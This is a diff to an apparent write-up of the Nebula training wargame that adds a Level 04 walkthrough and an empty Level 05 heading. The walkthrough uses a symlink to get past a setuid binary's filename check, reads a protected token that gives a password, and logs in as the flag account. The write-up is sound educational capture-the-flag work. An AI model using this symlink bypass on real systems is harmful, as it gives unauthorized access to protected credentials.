@@ -17,7 +17,9 @@ The username and password for each level take  the form 'levelnn' where nn is th
 [Level 00](#level-00)  
 [Level 01](#level-01)  
 [Level 02](#level-02)  
-[Level 03](#level-03)  
+[Level 03](#level-03) 
+[Level 04](#level-04)  
+[Level 05](#level-05) 
 
 ### Level 00
 
@@ -137,3 +139,45 @@ drwxrwxrwt 2 root   root    40 2021-03-28 01:20 .X11-unix
 level03@nebula:~$ cat /tmp/flag.out 
 You have successfully executed getflag on a target account
 ```
+
+### Level 04
+
+[Level 04 Description](https://exploit.education/nebula/level-04/)  
+
+```
+level04@nebula:~$ ls
+level04@nebula:~$ ls -al /home/flag04
+total 13
+drwxr-x--- 2 flag04 level04   93 2011-11-20 21:52 .
+drwxr-xr-x 1 root   root     120 2012-08-27 07:18 ..
+-rw-r--r-- 1 flag04 flag04   220 2011-05-18 02:54 .bash_logout
+-rw-r--r-- 1 flag04 flag04  3353 2011-05-18 02:54 .bashrc
+-rwsr-x--- 1 flag04 level04 7428 2011-11-20 21:52 flag04
+-rw-r--r-- 1 flag04 flag04   675 2011-05-18 02:54 .profile
+-rw------- 1 flag04 flag04    37 2011-11-20 21:52 token
+level04@nebula:~$  /home/flag04/flag04 
+/home/flag04/flag04 [file to read]
+level04@nebula:~$ /home/flag04/flag04 token
+You may not access 'token'
+```
+It's not possible to open the `token` file. Looking at code provided in the description token file needs to be called anything except token.
+
+```
+level04@nebula:~$ ln -s /home/flag04/token ttttt
+level04@nebula:~$ /home/flag04/flag04 ttttt 
+[REDACTED]
+```
+This gives a password that we can use to log in as the flag04 user.
+
+```
+ssh flag04@IPADDRESS
+[ENTER THE PASSWORD]
+```
+Now run the get flag command.
+```
+flag04@nebula:~$ getflag 
+You have successfully executed getflag on a target account
+```
+### Level 05
+
+[Level 05 Description](https://exploit.education/nebula/level-05/)  
